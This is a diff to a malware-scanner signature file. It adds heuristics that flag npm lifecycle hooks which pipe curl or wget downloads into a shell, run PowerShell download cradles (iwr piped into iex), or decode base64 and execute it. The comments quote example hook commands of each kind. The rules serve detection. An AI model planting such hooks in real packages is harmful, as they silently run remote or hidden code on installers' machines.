@@ -165,3 +165,48 @@ signatures:
     heuristic: gitignore-worm-marker
     description: ".gitignore references worm self-exclusion batch files (temp_auto_push.bat, temp_interactive_push.bat, config.bat)"
     exact: false
+
+  # --- npm-postinstall-worm heuristics ---
+  # Scoped to package.json's auto-run lifecycle hooks only (preinstall,
+  # install, postinstall, prepare — the scripts npm executes on its own
+  # during `npm install`, without the developer explicitly invoking them).
+  # Ordinary scripts like "test"/"build"/"start" are deliberately excluded:
+  # those require an explicit `npm run`, so they're not part of the
+  # install-time worm vector and including them would just add noise.
+  - id: heuristic-postinstall-curl-pipe-shell
+    kind: heuristic
+    heuristic: postinstall-curl-pipe-shell
+    description: "package.json lifecycle script (preinstall/install/postinstall/prepare) pipes a curl/wget download straight into a shell interpreter"
+    exact: false
+    # Detects: "postinstall": "curl -fsSL https://x/y.sh | bash" and wget
+    # variants. Why it's not a false-positive magnet: legitimate installers
+    # never need to fetch-and-immediately-execute a remote shell script as
+    # part of `npm install` — if a package needs a downloaded asset it saves
+    # it to a file first. curl/wget piped directly into sh/bash/zsh is
+    # exactly the classic self-propagating "curl | bash" worm pattern and
+    # has essentially no legitimate use inside an npm lifecycle hook.
+
+  - id: heuristic-postinstall-powershell-cradle
+    kind: heuristic
+    heuristic: postinstall-powershell-cradle
+    description: "package.json lifecycle script contains a PowerShell download-cradle (iwr/irm piped into iex) — the Windows-targeting worm variant"
+    exact: false
+    # Detects: "preinstall": "iwr -useb https://x/y.ps1 | iex" (and
+    # Invoke-WebRequest/Invoke-RestMethod/Invoke-Expression spellings). Why
+    # it's not a false-positive magnet: npm packages target Node, which is
+    # already cross-platform — there's no legitimate reason for a package.json
+    # lifecycle script to shell out to a raw PowerShell download-and-execute
+    # cradle; this specific idiom is a well-known indicator used almost
+    # exclusively by malware droppers.
+
+  - id: heuristic-postinstall-base64-shell
+    kind: heuristic
+    heuristic: postinstall-base64-shell
+    description: "package.json lifecycle script decodes a base64 blob and pipes it straight into a shell interpreter"
+    exact: false
+    # Detects: "install": "echo <b64> | base64 -d | bash" (and openssl
+    # enc -d variants). Why it's not a false-positive magnet: legitimate
+    # install scripts have no reason to hide their own command from a plain
+    # read of package.json — base64-then-exec in a lifecycle hook is a
+    # deliberate obfuscation technique to dodge keyword/URL scanning, not a
+    # pattern that shows up in ordinary tooling.
